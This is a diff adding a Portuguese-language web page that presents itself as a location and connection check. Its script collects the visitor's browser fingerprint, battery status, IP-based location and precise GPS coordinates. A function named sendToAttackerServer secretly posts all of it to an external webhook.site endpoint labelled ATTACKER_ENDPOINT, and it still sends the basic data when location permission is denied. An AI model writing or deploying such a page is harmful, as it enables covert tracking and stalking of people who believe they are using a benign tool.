@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificar Localização</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; padding: 20px; background-color: #f4f4f4; }
+        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        h1 { color: #333; }
+        .status { padding: 10px; margin: 10px 0; border-radius: 4px; }
+        .success { background-color: #d4edda; color: #155724; }
+        .error { background-color: #f8d7da; color: #721c24; }
+        .data { background-color: #e9ecef; padding: 10px; border-radius: 4px; font-family: monospace; white-space: pre-wrap; }
+        button { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #0056b3; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📍 Verificação de Localização</h1>
+        <p>Clique no botão abaixo para verificar sua localização atual e o status da sua conexão.</p>
+        
+        <button id="trackBtn">Iniciar Verificação</button>
+        
+        <div id="statusMsg" class="status hidden"></div>
+        <div id="dataOutput" class="data hidden"></div>
+    </div>
+
+    <script>
+        document.getElementById('trackBtn').addEventListener('click', async function() {
+            const statusMsg = document.getElementById('statusMsg');
+            const dataOutput = document.getElementById('dataOutput');
+            
+            // Limpar estados anteriores
+            statusMsg.className = 'status hidden';
+            dataOutput.className = 'data hidden';
+
+            // 1. Coletar dados básicos
+            const basicData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                online: navigator.onLine,
+                battery: await getBatteryInfo()
+            };
+
+            // 2. Coletar IP (via API pública)
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                basicData.ip = ipData.ip;
+                basicData.city = ipData.city;
+                basicData.country = ipData.country_name;
+                basicData.lat_approx = ipData.latitude;
+                basicData.lon_approx = ipData.longitude;
+            } catch (e) {
+                basicData.ip = "Erro ao obter IP";
+            }
+
+            // 3. Coletar Geolocalização Precisa (GPS/Wi-Fi)
+            statusMsg.textContent = "Aguardando permissão de localização...";
+            statusMsg.className = 'status';
+            
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        basicData.lat_exact = position.coords.latitude;
+                        basicData.lon_exact = position.coords.longitude;
+                        basicData.accuracy = position.coords.accuracy;
+                        basicData.timestamp = new Date(position.timestamp).toISOString();
+                        
+                        statusMsg.textContent = "Localização obtida com sucesso!";
+                        statusMsg.className = 'status success';
+                        
+                        // Exibir dados localmente para o usuário
+                        dataOutput.textContent = JSON.stringify(basicData, null, 2);
+                        dataOutput.className = 'data';
+                        
+                        // 4. Enviar para o seu "Servidor"
+                        sendToAttackerServer(basicData);
+                        resolve();
+                    },
+                    (error) => {
+                        basicData.geo_error = error.message;
+                        statusMsg.textContent = "Erro ao obter localização: " + error.message;
+                        statusMsg.className = 'status error';
+                        
+                        // Ainda assim, envia os dados básicos (IP, UserAgent)
+                        dataOutput.textContent = JSON.stringify(basicData, null, 2);
+                        dataOutput.className = 'data';
+                        sendToAttackerServer(basicData);
+                        resolve();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        });
+
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            }
+            return null;
+        }
+
+        function sendToAttackerServer(data) {
+            const ATTACKER_ENDPOINT = 'https://webhook.site/3e64b456-7cb2-417a-96bd-82fba682b80d'; 
+            
+            fetch(ATTACKER_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(console.error);
+        }
+    </script>
+</body>
+</html>
